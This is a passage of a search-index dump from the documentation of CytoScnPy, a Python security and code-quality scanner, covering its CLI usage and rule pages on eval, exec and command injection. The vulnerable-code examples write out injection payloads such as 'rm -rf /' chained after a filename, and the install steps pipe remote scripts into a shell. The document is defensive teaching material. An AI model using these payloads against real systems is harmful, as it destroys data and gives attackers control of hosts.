total ground truth items, 11 tools benchmarked</p>"},{"location":"security/","title":"Security Analysis","text":"<p>CytoScnPy includes a powerful security engine powered by Rust. It performs Secret Scanning, Dangerous Pattern Matching, and Taint Analysis.</p>"},{"location":"security/#running-security-scans","title":"Running Security Scans","text":"<p>To enable security checks, use the <code>--secrets</code> and <code>--danger</code> flags:</p> <pre><code>cytoscnpy . --secrets --danger\n</code></pre>"},{"location":"security/#secret-scanning-secrets","title":"Secret Scanning (<code>--secrets</code>)","text":"<p>Detects hardcoded secrets, API keys, and credentials using a combination of regex patterns and Shannon Entropy analysis.</p> <ul> <li>AWS Keys: Access IDs, Secret Keys.</li> <li>API Tokens: Stripe, Slack, PyPI, GitHub, etc.</li> <li>Private Keys: RSA, DSA, EC private keys.</li> <li>High Entropy Strings: Random strings that look like secrets but don't match specific patterns.</li> </ul>"},{"location":"security/#dangerous-code-danger","title":"Dangerous Code (<code>--danger</code>)","text":"<p>Detects patterns known to cause vulnerabilities.</p> <p>For a complete list of all rules organized by category, see: Dangerous Code Rules</p>"},{"location":"security/#rule-categories","title":"Rule Categories","text":"<ul> <li>Code Execution &amp; Unsafe Calls (CSP-D0xx)</li> <li>Injection &amp; Logic Attacks (CSP-D1xx)</li> <li>Deserialization (CSP-D2xx)</li> <li>Cryptography &amp; Randomness (CSP-D3xx)</li> <li>Network &amp; HTTP Security (CSP-D4xx)</li> <li>File Operations &amp; Path Traversal (CSP-D5xx)</li> <li>Modern Python &amp; Frameworks (CSP-D9xx)</li> </ul>"},{"location":"security/#taint-analysis","title":"Taint Analysis","text":"<p>CytoScnPy goes beyond simple pattern matching by tracking data flow.</p> <ul> <li>Sources: User inputs (Flask <code>request</code>, Django <code>request</code>, CLI args, Environment variables).</li> <li>Sinks: Dangerous functions (SQL execute, eval, os.system).</li> <li>Sanitizers: Functions that clean data (e.g., <code>int()</code>, <code>escape()</code>).</li> </ul> <p>If data flows from a Source to a Sink without passing through a Sanitizer, it is flagged as a vulnerability.</p>"},{"location":"security/#supported-analysis-levels","title":"Supported Analysis Levels","text":"Level Description Implementation Intraprocedural Checks flows within single functions. Fast, catches local bugs Interprocedural Checks flows across functions in the same file. Tracks cross-function data flow Cross-file Checks flows across module boundaries. Deep analysis (highest precision) <p>CytoScnPy uses a multi-layered approach to track taint across your entire project, identifying vulnerabilities where untrusted input reaches critical system sinks.</p>"},{"location":"usage/","title":"User Guide","text":"<p>This guide covers everything you need to know to use CytoScnPy effectively.</p>"},{"location":"usage/#quick-start","title":"\ud83d\ude80 Quick Start","text":"<p>Run analysis on your current directory:</p> <pre><code>cytoscnpy . --secrets --danger --quality\n</code></pre>"},{"location":"usage/#features-usage","title":"Features &amp; Usage","text":""},{"location":"usage/#dead-code-detection","title":"\ud83d\udc80 Dead Code Detection","text":"<p>CytoScnPy statically analyzes your code to find unused symbols. It detects:</p> <ul> <li>Functions &amp; Classes: Definitions that are never called.</li> <li>Methods: Cascading detection (if a class is unused, its methods are too).</li> <li>Imports: Unused import statements.</li> <li>Variables: Local variables assigned but never read.</li> </ul>"},{"location":"usage/#installation","title":"\ud83d\udce6 Installation","text":"<p>Linux / macOS:</p> <pre><code># Install\ncurl -fsSL https://raw.githubusercontent.com/djinn09/CytoScnPy/main/install.sh | bash\n</code></pre> <p>Windows (PowerShell):</p> <pre><code># Install\nirm https://raw.githubusercontent.com/djinn09/CytoScnPy/main/install.ps1 | iex\n</code></pre> <p>Framework Support: Automatically detects usage in Flask routes, Django views, FastAPI endpoints, and Pydantic models.</p>"},{"location":"usage/#security-analysis","title":"\ud83d\udd12 Security Analysis","text":"<p>Enable with <code>--secrets</code> and <code>--danger</code>.</p> <p>Secret Scanning: Finds hardcoded secrets (API keys, tokens) using regex and entropy analysis. Dangerous Code: Detects patterns known to cause vulnerabilities (SQLi, XSS, RCE, etc.).</p> <p>For detailed vulnerability rules (<code>CSP-Dxxx</code>), see the Dangerous Code Rules Index or the general Security Analysis overview.</p>"},{"location":"usage/#code-quality-metrics","title":"\ud83d\udcca Code Quality Metrics","text":"<p>Enable with <code>--quality</code>.</p> <ul> <li>Cyclomatic Complexity (CC): Measures code branching.</li> <li>Maintainability Index (MI): 0-100 score (higher is better).</li> <li>Halstead Metrics: Algorithmic complexity.</li> </ul> <p>For a full list of quality rules and their standard IDs (B006, E722, etc.), see the Code Quality Rules reference.</p>"},{"location":"usage/#clone-detection","title":"\ud83e\udde9 Clone Detection","text":"<p>Finds duplicate or near-duplicate code blocks (Type-1, Type-2, and Type-3 clones).</p> <pre><code>cytoscnpy . --clones --clone-similarity 0.8\n</code></pre> <ul> <li>Type-1: Exact copies (identical code).</li> <li>Type-2: Syntactically identical (variable renaming).</li> <li>Type-3: Near-miss clones (small edits/additions).</li> </ul> <p>Options:</p> <ul> <li><code>--clone-similarity &lt;0.0-1.0&gt;</code>: Minimum similarity threshold. Default is <code>0.8</code> (80% similarity). Lower values find more matches but may increase false positives.</li> </ul> <p>Performance: Clone detection is computationally intensive for very large codebases.</p>"},{"location":"usage/#auto-fix","title":"\ud83d\udee0\ufe0f Auto-Fix","text":"<p>Remove dead code automatically.</p> <ol> <li>Preview: <code>cytoscnpy . --fix</code></li> <li>Apply: <code>cytoscnpy . --fix --apply</code></li> </ol>"},{"location":"usage/#html-reports","title":"\ud83d\udcc4 HTML Reports","text":"<p>Generate interactive, self-contained HTML reports for easier navigation of findings.</p> <pre><code>cytoscnpy . --html --secrets --danger\n</code></pre> <p>(Note: <code>--html</code> automatically enables <code>--quality</code> but strictly security scans need explicit flags).</p> <p>Features:</p> <ul> <li>Dashboard: High-level summary of issues.</li> <li>Search: Interactive search across all findings.</li> <li>Filtering: Filter by severity, category, or file.</li> <li>Source View: Clickable file links with line numbers.</li> </ul> <p>When to use HTML vs JSON:</p> <ul> <li>Use HTML for human review and team sharing.</li> <li>Use JSON (<code>--json</code>) for CI/CD pipelines and automated processing.</li> </ul>"},{"location":"usage/#cicd-integration","title":"\ud83d\ude80 CI/CD Integration","text":"<p>CytoScnPy is designed to work seamlessly with modern CI/CD pipelines. Using the <code>--root</code> flag and specific <code>--format</code> options, you can integrate analysis results directly into your build process.</p> <p>[!IMPORTANT] Always use <code>--root .</code> (or your project path) in CI/CD. This ensures that:</p> <ol> <li>Absolute paths are correctly normalized to relative paths in reports.</li> <li>Security containment boundaries are correctly established.</li> <li>Fingerprints (for GitLab/GitHub) remain stable across different build runners.</li> </ol>"},{"location":"usage/#gitlab-code-quality","title":"GitLab Code Quality","text":"<p>Generate a report that GitLab can display directly in Merge Requests.</p> <pre><code># .gitlab-ci.yml\ncode_quality:\n  stage: test\n  image: python:3.9\n  script:\n    - pip install cytoscnpy\n    - cytoscnpy --root . --format gitlab --danger --secrets &gt; gl-code-quality-report.json\n  artifacts:\n    reports:\n      codequality: gl-code-quality-report.json\n</code></pre>"},{"location":"usage/#github-actions","title":"GitHub Actions","text":"<p>Generate inline annotations for your Pull Requests.</p> <pre><code># .github/workflows/scan.yml\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install CytoScnPy\n        run: pip install cytoscnpy\n      - name: Run Scan\n        run: cytoscnpy --root . --format github --danger --secrets\n</code></pre>"},{"location":"usage/#sarif-github-security-gitlab-security","title":"SARIF (GitHub Security / GitLab Security)","text":"<p>Export results in the standard Static Analysis Results Interchange Format (SARIF).</p> <pre><code>cytoscnpy --root . --format sarif --danger &gt; results.sarif\n</code></pre>"},{"location":"usage/#junit-xml","title":"JUnit XML","text":"<p>Integration with test runners and CI platforms that support JUnit (Azure DevOps, Jenkins).</p> <pre><code>cytoscnpy --root . --format junit --quality &gt; test-results.xml\n</code></pre>"},{"location":"usage/#pre-commit-hooks","title":"\u2693 Pre-commit Hooks","text":""},{"location":"usage/#configuration","title":"\u2699\ufe0f Configuration","text":"<p>CytoScnPy supports configuration via:</p> <ol> <li><code>.cytoscnpy.toml</code> (Project root)</li> <li><code>pyproject.toml</code> (Scanning under <code>[tool.cytoscnpy]</code>)</li> </ol>"},{"location":"usage/#option-1-cytoscnpytoml","title":"Option 1: <code>.cytoscnpy.toml</code>","text":"<pre><code>[cytoscnpy]\nconfidence = 60\nexclude_folders = [\"venv\", \"build\", \"dist\"]\nsecrets = true\ndanger = true\nquality = true\ninclude_ipynb = false\n\n# CI/CD Gates (Fail if exceeded)\nfail_threshold = 5.0   # &gt;5% unused code\nmax_complexity = 15    # Function CC &gt; 15\nmin_mi = 40.0         # MI &lt; 40\n</code></pre>"},{"location":"usage/#option-2-pyprojecttoml","title":"Option 2: <code>pyproject.toml</code>","text":"<pre><code>[tool.cytoscnpy]\nconfidence = 60\nexclude_folders = [\"venv\", \"build\", \"dist\"]\nsecrets = true\ndanger = true\nquality = true\n\n# CI/CD Gates\nfail_threshold = 5.0\nmax_complexity = 15\nmin_mi = 40.0\n</code></pre>"},{"location":"usage/#cli-reference","title":"\ud83d\udcd6 CLI Reference","text":"<p>For a complete reference, see docs/CLI.md.</p> <pre><code>cytoscnpy [PATHS]... [OPTIONS]\n</code></pre>"},{"location":"usage/#core-options","title":"Core Options","text":"Flag Description <code>--root &lt;PATH&gt;</code> Project root for analysis (CI/CD mode). <code>--confidence &lt;N&gt;</code> Minimum confidence threshold (0-100). Default: 60. <code>--secrets</code> (<code>-s</code>) Scan for API keys, tokens, credentials. <code>--danger</code> (<code>-d</code>) Scan for dangerous code + taint analysis. <code>--quality</code> (<code>-q</code>) Scan for code quality issues. <code>--clones</code> Enable code clone detection. <code>--no-dead</code> (<code>-n</code>) Skip dead code detection."},{"location":"usage/#output-formatting","title":"Output Formatting","text":"Flag Description <code>--format &lt;FMT&gt;</code> Output format: <code>text</code>, <code>json</code>, <code>junit</code>, <code>github</code>, <code>gitlab</code>, <code>markdown</code>, <code>sarif</code>. <code>--json</code> Output detection results as JSON (shorthand for <code>--format json</code>). <code>--html</code> Generate interactive HTML report. <code>--quiet</code> Summary only, no detailed tables. <code>--verbose</code> (<code>-v</code>) Debug output."},{"location":"usage/#filtering","title":"Filtering","text":"Flag Description <code>--exclude-folder &lt;DIR&gt;</code> Exclude specific folders. <code>--include-folder &lt;DIR&gt;</code> Force include folders. <code>--include-tests</code> Include test files in analysis. <code>--include-ipynb</code> Include Jupyter notebooks."},{"location":"usage/#cicd-quality-gates","title":"CI/CD Quality Gates","text":"<p>CytoScnPy can enforce quality standards by exiting with code <code>1</code>:</p> Flag Description <code>--fail-threshold &lt;N&gt;</code> Fail if unused code % &gt; N. <code>--max-complexity &lt;N&gt;</code> Fail if any function complexity &gt; N. <code>--min-mi &lt;N&gt;</code> Fail if Maintainability Index &lt; N. <code>--fail-on-quality</code> Fail on any quality issue."},{"location":"usage/#subcommands","title":"Subcommands","text":"<p>CytoScnPy has specialized subcommands for specific metrics.</p>"},{"location":"usage/#hal-halstead-metrics","title":"<code>hal</code> - Halstead Metrics","text":"<pre><code>cytoscnpy hal . --functions\n</code></pre> <p>Calculates Halstead complexity metrics.</p> <ul> <li><code>--functions</code>: Compute at function level.</li> </ul>"},{"location":"usage/#files-per-file-metrics","title":"<code>files</code> - Per-File Metrics","text":"<pre><code>cytoscnpy files . --json\n</code></pre> <p>Shows detailed metrics table for each file.</p>"},{"location":"usage/#cc-cyclomatic-complexity","title":"<code>cc</code> - Cyclomatic Complexity","text":"<pre><code>cytoscnpy cc . --min-rank C --show-complexity\n</code></pre> <p>Calculates McCabe complexity.</p> <ul> <li><code>--show-complexity</code>: Show score.</li> <li><code>--min-rank &lt;A-F&gt;</code>: Filter by rank (A=Simple ... F=Critical).</li> <li><code>--max-complexity &lt;N&gt;</code>: Fail if complexity &gt; N.</li> </ul>"},{"location":"usage/#mi-maintainability-index","title":"<code>mi</code> - Maintainability Index","text":"<pre><code>cytoscnpy mi . --show --average\n</code></pre> <p>Calculates Maintainability Index (0-100).</p> <ul> <li><code>--show</code>: Show values.</li> <li><code>--fail-threshold &lt;N&gt;</code>: Fail if MI &lt; N.</li> </ul>"},{"location":"usage/#additional-quality-options","title":"Additional Quality Options","text":"Flag Description <code>--max-nesting &lt;N&gt;</code> Fail if nesting depth &gt; N. <code>--max-args &lt;N&gt;</code> Fail if function arguments &gt; N. <code>--max-lines &lt;N&gt;</code> Fail if function lines &gt; N. <code>--ipynb-cells</code> Report findings at cell level for notebooks."},{"location":"usage/#raw-raw-metrics","title":"<code>raw</code> - Raw Metrics","text":"<pre><code>cytoscnpy raw . --json\n</code></pre> <p>Calculates LOC, SLOC, Comments, Blank lines.</p>"},{"location":"usage/#stats-project-statistics","title":"<code>stats</code> - Project Statistics","text":"<pre><code>cytoscnpy stats . --all\n</code></pre> <p>Runs full analysis (secrets, danger, quality) and prints summary statistics.</p> <p>Options:</p> <ul> <li><code>--all</code> (<code>-a</code>): Enable all scanners (secrets, danger, quality).</li> <li><code>--secrets</code> (<code>-s</code>): Enable secret scanning.</li> <li><code>--danger</code> (<code>-d</code>): Enable danger/taint analysis.</li> <li><code>--quality</code> (<code>-q</code>): Enable quality analysis.</li> <li><code>--exclude-folder &lt;DIR&gt;</code>: Exclude specific folders from stats analysis.</li> <li><code>--json</code>: Output as JSON.</li> <li><code>--output &lt;FILE&gt;</code> (<code>-o</code>): Save report to file.</li> </ul>"},{"location":"usage/#mcp-server-mcp-integration","title":"<code>mcp-server</code> - MCP Integration","text":"<pre><code>cytoscnpy mcp-server\n</code></pre> <p>Starts the Model Context Protocol (MCP) server for integration with AI assistants (Claude Desktop, Cursor, GitHub Copilot).</p>"},{"location":"usage/#troubleshooting","title":"\ud83d\udd27 Troubleshooting","text":""},{"location":"usage/#common-issues","title":"Common Issues","text":"<p>1. \"Too many open files\" error</p> <ul> <li>Limit parallelization or exclude large directories (<code>node_modules</code>, <code>.git</code>).</li> </ul> <p>2. False Positives</p> <ul> <li>Use inline comments to suppress findings on a specific line:</li> </ul> Comment Effect <code># pragma: no cytoscnpy</code> Legacy format (suppresses all CytoScnPy findings) <code># noqa</code> Bare noqa (suppresses all CytoScnPy findings) <code># ignore</code> Bare ignore (suppresses all CytoScnPy findings) <code># noqa</code> (for Quality) Use bare <code># noqa</code> for quality rules for now <code># noqa: CSP-Dxxx</code> Specific (suppresses only a specific Danger rule) <p>Examples:</p> <pre><code>def mutable_default(arg=[]):  # noqa\n    pass\n\nx = [1, 2] == None # noqa -- suppress dangerous comparison\ny = api_key  # pragma: no cytoscnpy\n</code></pre> <ul> <li>For bulk ignores, use the <code>.cytoscnpy.toml</code> configuration file's ignore list.</li> </ul> <p>3. Performance is slow</p> <ul> <li>Check if large files or build artifacts are being scanned. Use <code>--exclude-folder</code>.</li> <li>Clone detection is slower than standard analysis.</li> </ul> <p>4. \"Missing integrity\" finding</p> <ul> <li>Security check requires SRI hashes for external scripts. Add <code>integrity=\"...\"</code> to your HTML.</li> </ul>"},{"location":"usage/#links","title":"Links","text":"<ul> <li>PyPI: pypi.org/project/cytoscnpy</li> <li>VS Code Extension: Visual Studio Marketplace</li> <li>GitHub Repository: github.com/djinn09/CytoScnPy</li> </ul>"},{"location":"blog/","title":"Blog","text":"<p>Welcome to the CytoScnPy blog. Here we share updates, release notes, and static analysis tips.</p>"},{"location":"blog/2025/12/28/welcome-to-cytoscnpy/","title":"Welcome to CytoScnPy","text":"<p>We are excited to launch our new documentation site and blog!</p> <p>CytoScnPy is growing fast, and we want to keep you updated on all the latest performance improvements and security features.</p> <p>Stay tuned for more updates!</p>"},{"location":"danger/best-practices/","title":"Best Practices Rules","text":"<p>This section highlights deviations from recommended secure coding practices.</p> <ul> <li>CSP-D701: Use of <code>assert</code> in Production</li> <li>CSP-D702: Insecure Module Import</li> <li>CSP-D703: Disabled Jinja2 Autoescaping</li> <li>CSP-D704: Blacklisted Function Calls</li> </ul>"},{"location":"danger/code-execution/","title":"Code Execution Rules","text":"<p>This section details rules related to code execution vulnerabilities.</p> <ul> <li>CSP-D001: Eval</li> <li>CSP-D002: Exec</li> <li>CSP-D003: Command Injection</li> <li>CSP-D004: Async Command Injection</li> <li>CSP-D005: Unsafe input() in Python 2</li> </ul>"},{"location":"danger/cryptography/","title":"Cryptography Rules","text":"<p>This section details rules related to insecure cryptography practices.</p> <ul> <li>CSP-D301: Weak Hashing (MD5)</li> <li>CSP-D302: Weak Hashing (SHA1)</li> <li>CSP-D304: Insecure Ciphers</li> <li>CSP-D305: Insecure Cipher Mode</li> <li>CSP-D311: Weak PRNG</li> </ul>"},{"location":"danger/deserialization/","title":"Deserialization Rules","text":"<p>This section details rules related to insecure deserialization practices.</p> <ul> <li>CSP-D201: Insecure Deserialization with Pickle</li> <li>CSP-D202: Unsafe YAML Load</li> <li>CSP-D203: <code>marshal.load()</code></li> <li>CSP-D204: ML Model Loading</li> </ul>"},{"location":"danger/filesystem/","title":"Filesystem Rules","text":"<p>This section details rules related to insecure file system operations.</p> <ul> <li>CSP-D501: Path Traversal</li> <li>CSP-D502: Insecure Tarfile Extraction</li> <li>CSP-D503: Insecure Zipfile Extraction</li> <li>CSP-D504: Insecure Temporary File Creation</li> <li>CSP-D505: Bad File Permissions</li> <li>CSP-D506: <code>os.tempnam</code>/<code>os.tmpnam</code></li> </ul>"},{"location":"danger/generic/","title":"Generic Rules","text":"<p>This is a catch-all category for general vulnerabilities.</p> <ul> <li>CSP-X001: Generic XSS</li> </ul>"},{"location":"danger/injection/","title":"Injection Rules","text":"<p>This section details rules related to injection vulnerabilities.</p> <ul> <li>CSP-D101: SQL Injection</li> <li>CSP-D102: Raw SQL String Concatenation</li> <li>CSP-D103: Cross-Site Scripting (XSS)</li> <li>CSP-D104: Insecure XML Parsing (XXE)</li> <li>CSP-D105: Use of <code>mark_safe</code></li> </ul>"},{"location":"danger/modern-python/","title":"Category 9: Information Privacy &amp; Frameworks (CSP-D9xx)","text":"<p>This category covers security rules for sensitive data handling, information leakage, and specific web framework misconfigurations (e.g., Django, Flask).</p> Rule ID Pattern Severity Why it's risky Safer alternative / Fix CSP-D901 Logging sensitive variables MEDIUM Data leakage in logs Redact passwords, tokens, API keys CSP-D902 Hardcoded <code>SECRET_KEY</code> CRITICAL Key exposure in Django Store in environment variables"},{"location":"danger/modern-python/#in-depth-logging-sensitive-data-csp-d901","title":"In-depth: Logging Sensitive Data (CSP-D901)","text":"<p>Logging sensitive information like API keys or user passwords can lead to data breaches if logs are compromised.</p>"},{"location":"danger/modern-python/#dangerous-pattern","title":"Dangerous Pattern","text":"<pre><code>import logging\napi_key = \"sk-...\"\nlogging.info(f\"Using API key: {api_key}\") # DANGEROUS: Leaks in logs\n</code></pre>"},{"location":"danger/modern-python/#safe-alternative","title":"Safe Alternative","text":"<pre><code>import logging\napi_key = \"sk-...\"\nlogging.info(\"Using API key: [REDACTED]\") # SAFE\n</code></pre>"},{"location":"danger/modern-python/#in-depth-framework-secrets-csp-d902","title":"In-depth: Framework Secrets (CSP-D902)","text":"<p>Framework settings files often contain sensitive keys that must not be committed to source control. Hardcoded secrets are easily discovered by attackers.</p>"},{"location":"danger/modern-python/#dangerous-pattern-django","title":"Dangerous Pattern (Django)","text":"<pre><code># settings.py\nSECRET_KEY = 'django-insecure-hardcoded-key-here' # VULNERABLE\n</code></pre>"},{"location":"danger/modern-python/#safe-alternative_1","title":"Safe Alternative","text":"<pre><code>import os\nSECRET_KEY = os.environ.get('DJANGO_SECRET_KEY') # SAFE: Loaded from env\n</code></pre>"},{"location":"danger/network/","title":"Network Rules","text":"<p>This section details rules related to insecure network communication practices.</p> <ul> <li>CSP-D401: Insecure Requests (verify=False)</li> <li>CSP-D402: Server-Side Request Forgery (SSRF)</li> <li>CSP-D403: Debug Mode in Production</li> <li>CSP-D404: Hardcoded Binding to 0.0.0.0</li> <li>CSP-D405: Requests Without Timeout</li> <li>CSP-D406: Insecure FTP</li> <li>CSP-D407: HTTPSConnection Without Context</li> <li>CSP-D408: Unverified SSL Context</li> <li>CSP-D409: Insecure Telnet</li> <li>CSP-D410: Insecure URL Opening</li> <li>CSP-D411: <code>ssl.wrap_socket</code> Usage</li> </ul>"},{"location":"danger/open-redirect/","title":"Open Redirect Rules","text":"<p>This category covers vulnerabilities related to insecure redirection.</p> <ul> <li>CSP-D801: Open Redirect</li> </ul>"},{"location":"danger/privacy/","title":"Privacy Rules","text":"<p>This section addresses potential privacy violations.</p> <ul> <li>CSP-D901: Logging of Sensitive Data</li> <li>CSP-D902: Hardcoded Django <code>SECRET_KEY</code></li> </ul>"},{"location":"danger/type-safety/","title":"Type Safety Rules","text":"<p>This section addresses potential issues related to type handling.</p> <ul> <li>CSP-D601: Method Misuse</li> </ul>"},{"location":"rule/CSP-D001/","title":"CSP-D001: Use of <code>eval()</code>","text":"<p>Vulnerability Category: <code>Code Execution</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D001/#description","title":"Description","text":"<p>The <code>eval()</code> function in Python is a powerful tool that allows for the dynamic execution of Python code from a string. However, it is also a significant security risk when used with untrusted input. An attacker can inject malicious code into the <code>eval()</code> function, which will then be executed with the same permissions as the running application. This can lead to a full system compromise.</p>"},{"location":"rule/CSP-D001/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import os\n\nuser_input = input(\"Enter a value: \")\n\n# The user can enter a malicious string like:\n# __import__('os').system('rm -rf /')\nresult = eval(user_input)\n\nprint(f\"Result: {result}\")\n</code></pre> In this example, the user can provide a string that, when evaluated, will execute a dangerous command.</p>"},{"location":"rule/CSP-D001/#safe-code-example","title":"Safe Code Example","text":"<p>In many cases, <code>eval()</code> is used to parse simple data structures. The <code>ast.literal_eval()</code> function can be used as a safer alternative in these situations. <code>literal_eval()</code> will only evaluate a limited set of Python literals, such as strings, numbers, tuples, lists, dicts, booleans, and <code>None</code>.</p> <p><pre><code>import ast\n\nuser_input = input(\"Enter a value: \")\n\ntry:\n    # Safely evaluate a literal string\n    result = ast.literal_eval(user_input)\n    print(f\"Result: {result}\")\nexcept (ValueError, SyntaxError):\n    print(\"Invalid input.\")\n</code></pre> If you need to execute more complex code, it is better to redesign your application to avoid dynamic code execution. If that is not possible, you must ensure that the input to <code>eval()</code> is strictly controlled and sanitized.</p>"},{"location":"rule/CSP-D001/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have assessed the risk and have determined that the use of <code>eval()</code> is safe in your specific context, you can suppress the finding by adding a comment to the line of code:</p> <pre><code># ignore\nresult = eval(user_input)\n</code></pre> <p>You can also be more specific and suppress only this particular rule:</p> <pre><code># ignore: CSP-D001\nresult = eval(user_input)\n</code></pre>"},{"location":"rule/CSP-D002/","title":"CSP-D002: Use of <code>exec()</code>","text":"<p>Vulnerability Category: <code>Code Execution</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D002/#description","title":"Description","text":"<p>The <code>exec()</code> function in Python is used for the dynamic execution of Python code. It is similar to <code>eval()</code>, but <code>exec()</code> can execute arbitrary code blocks, including statements, whereas <code>eval()</code> can only evaluate a single expression. Using <code>exec()</code> with untrusted input is extremely dangerous and can lead to arbitrary code execution and full system compromise.</p>"},{"location":"rule/CSP-D002/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import os\n\nuser_input = input(\"Enter a command: \")\n\n# The user can enter a malicious string like:\n# \"os.system('rm -rf /')\"\nexec(user_input)\n</code></pre> In this example, the user can provide a string that, when executed, will run a dangerous command with the privileges of the application.</p>"},{"location":"rule/CSP-D002/#safe-code-example","title":"Safe Code Example","text":"<p>The safest approach is to avoid <code>exec()</code> entirely. If you need to execute different code paths based on user input, use explicit dispatching, such as a dictionary of functions.</p> <p><pre><code>def say_hello():\n    print(\"Hello!\")\n\ndef say_goodbye():\n    print(\"Goodbye!\")\n\ncommands = {\n    \"hello\": say_hello,\n    \"goodbye\": say_goodbye,\n}\n\nuser_input = input(\"Enter a command: \")\n\ncommand_func = commands.get(user_input)\nif command_func:\n    command_func()\nelse:\n    print(\"Unknown command.\")\n</code></pre> This approach is much safer as it only allows the execution of pre-defined functions and does not allow for arbitrary code execution.</p>"},{"location":"rule/CSP-D002/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have performed a thorough security review and are confident that the input to <code>exec()</code> is properly sanitized and controlled, you can suppress the finding with a comment:</p> <pre><code># ignore\nexec(sanitized_input)\n</code></pre> <p>You can also suppress only this specific rule:</p> <pre><code># ignore: CSP-D002\nexec(sanitized_input)\n</code></pre>"},{"location":"rule/CSP-D003/","title":"CSP-D003: Command Injection","text":"<p>Vulnerability Category: <code>Code Execution</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D003/#description","title":"Description","text":"<p>Command injection vulnerabilities are severe security flaws that allow an attacker to execute arbitrary commands on the host operating system. This vulnerability arises when an application passes untrusted user input to a system shell. Functions like <code>os.system()</code> and <code>subprocess.run()</code> with <code>shell=True</code> are common sources of command injection vulnerabilities.</p> <p>An attacker can inject shell metacharacters (e.g., <code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, <code>`</code>, <code>$(...)</code>) to chain commands and take control of the server.</p>"},{"location":"rule/CSP-D003/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import os\nimport subprocess\n\nfilename = input(\"Enter the filename to display: \")\n\n# Vulnerable to command injection\n# An attacker could enter: \"my_file.txt; rm -rf /\"\nos.system(f\"cat {filename}\")\n\n# Also vulnerable\nsubprocess.run(f\"cat {filename}\", shell=True)\n</code></pre> <p>In both <code>os.system</code> and <code>subprocess.run</code> with <code>shell=True</code>, the string is passed to the system's shell, which interprets the user's input as part of the command.</p>"},{"location":"rule/CSP-D003/#safe-code-example","title":"Safe Code Example","text":"<p>To prevent command injection, avoid using <code>shell=True</code> and pass command arguments as a list. This ensures that user input is treated as a single argument and not interpreted by the shell.</p> <pre><code>import subprocess\nimport shlex\n\nfilename = input(\"Enter the filename to display: \")\n\n# The command and its arguments are passed as a list\n# The user input is treated as a single, safe argument\ntry:\n    # Passing as a list avoids the shell entirely and is safe.\n    subprocess.run([\"cat\", filename], check=True)\nexcept FileNotFoundError:\n    print(\"Error: cat command not found.\")\nexcept subprocess.CalledProcessError:\n    print(f\"Error: Could not display file {filename}.\")\n</code></pre> <p>By passing the arguments as a list, the operating system is responsible for handling the arguments safely, preventing the shell from interpreting them.</p>"},{"location":"rule/CSP-D003/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>Command injection is a critical vulnerability. Suppressing this finding is strongly discouraged. If you must, and have validated that the input is safe, you can use a suppression comment.</p> <pre><code># ignore\nos.system(f\"cat {validated_filename}\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D003\nsubprocess.run(f\"cat {validated_filename}\", shell=True)\n</code></pre>"},{"location":"rule/CSP-D004/","title":"CSP-D004: Async Command Injection","text":"<p>Vulnerability Category: <code>Code Execution</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D004/#description","title":"Description","text":"<p>This rule is a variant of CSP-D003 and applies to asynchronous applications using Python's <code>asyncio</code> library. The <code>asyncio.create_subprocess_shell()</code> function is vulnerable to command injection in the same way as its synchronous counterparts. An attacker can inject malicious commands by crafting a special input string, leading to arbitrary code execution on the server.</p>"},{"location":"rule/CSP-D004/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import asyncio\n\nasync def run_command(command):\n    # The command is passed to the system's shell, creating a vulnerability\n    proc = await asyncio.create_subprocess_shell(\n        command,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE\n    )\n\n    stdout, stderr = await proc.communicate()\n\n    if stdout:\n        print(f'[stdout]\\n{stdout.decode()}')\n    if stderr:\n        print(f'[stderr]\\n{stderr.decode()}')\n\nasync def main():\n    user_input = input(\"Enter a command to run: \")\n    # Attacker can input: \"echo hello; whoami\"\n    await run_command(user_input)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre> The user-provided <code>command</code> string is executed in a shell, allowing an attacker to chain commands.</p>"},{"location":"rule/CSP-D004/#safe-code-example","title":"Safe Code Example","text":"<p>To mitigate this risk, use <code>asyncio.create_subprocess_exec()</code> instead. This function takes the command and its arguments as a list, which prevents the shell from interpreting user input as commands.</p> <pre><code>import asyncio\nimport shlex\n\nasync def run_command(command_parts):\n    # The command and arguments are passed as a list\n    proc = await asyncio.create_subprocess_exec(\n        *command_parts,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE\n    )\n\n    stdout, stderr = await proc.communicate()\n\n    if stdout:\n        print(f'[stdout]\\n{stdout.decode()}')\n    if stderr:\n        print(f'[stderr]\\n{stderr.decode()}')\n\nasync def main():\n    user_input = input(\"Enter a file to display: \")\n    # Example: user enters \"my_document.txt\"\n    # It is safely split and quoted\n    command_parts = [\"cat\", shlex.quote(user_input)]\n    await run_command(command_parts)\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre>"},{"location":"rule/CSP-D004/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>This is a critical vulnerability and should not be suppressed. If you have rigorously validated the input and must use a shell, you can add a suppression comment.</p> <pre><code># ignore\nproc = await asyncio.create_subprocess_shell(validated_command)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D004\nproc = await asyncio.create_subprocess_shell(validated_command)\n</code></pre>"},{"location":"rule/CSP-D005/","title":"CSP-D005: Use of insecure <code>input()</code>","text":"<p>Vulnerability Category: <code>Code Execution</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D005/#description","title":"Description","text":"<p>This rule identifies the use of the <code>input()</code> function. In legacy Python (2.x) environments, <code>input()</code> is equivalent to <code>eval(raw_input())</code>, which means any string provided by the user is executed as Python code, creating 